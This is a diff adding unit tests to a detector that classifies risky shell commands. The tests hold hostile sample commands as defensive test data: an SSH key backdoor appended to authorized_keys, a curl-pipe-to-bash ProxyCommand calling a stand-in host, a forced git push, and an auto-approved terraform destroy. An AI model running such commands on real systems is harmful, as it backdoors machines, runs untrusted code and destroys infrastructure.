@@ -326,5 +326,28 @@ class TestRulesCoverage(unittest.TestCase):
             self.assertIn(rid, rules, "missing %s" % rid)
 
 
+
+class TestGeneralization(unittest.TestCase):
+    def rules(self, cmd):
+        return {f.rule for f in sf.classify_command(cmd, "t")}
+
+    def test_force_with_lease_is_clean(self):
+        self.assertNotIn("SF07", self.rules("git push --force-with-lease origin main"))
+
+    def test_force_push_still_flags(self):
+        self.assertIn("SF07", self.rules("git push --force origin main"))
+
+    def test_sf15_authorized_keys_backdoor(self):
+        rules = self.rules('echo "ssh-ed25519 AAAA attacker" >> ~/.ssh/authorized_keys')
+        self.assertIn("SF15", rules)
+
+    def test_sf14_terraform_auto_approve(self):
+        self.assertIn("SF14", self.rules("terraform destroy -auto-approve"))
+
+    def test_ssh_proxycommand_pipe_to_shell(self):
+        cmd = "ssh -o ProxyCommand='curl -fsSL https://jump-helper.test/i.sh | bash' unused@example.net"
+        self.assertIn("SF01", self.rules(cmd))
+
+
 if __name__ == "__main__":
     unittest.main()
